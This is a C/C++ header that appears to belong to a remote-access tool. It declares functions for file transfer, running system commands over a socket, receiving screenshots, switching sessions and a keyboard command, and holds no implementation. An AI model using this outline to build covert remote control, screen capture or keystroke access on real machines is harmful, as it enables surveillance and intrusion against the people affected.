#pragma once

// done with the limit transfer of 1024
void DownloadFile(MSG_INFO msgInfo);

// not yet done, cannot terminate itself after upload
void UploadFile(MSG_INFO msgInfo);

void SystemCmd(SOCKET client, char* pArg1, char* pArg2);
void SystemCmd(SOCKET client);
void RecvScreenPic(MSG_INFO msgInfo);
void ChangeSession(char* pArg1);
void KeyCmd(SOCKET client);
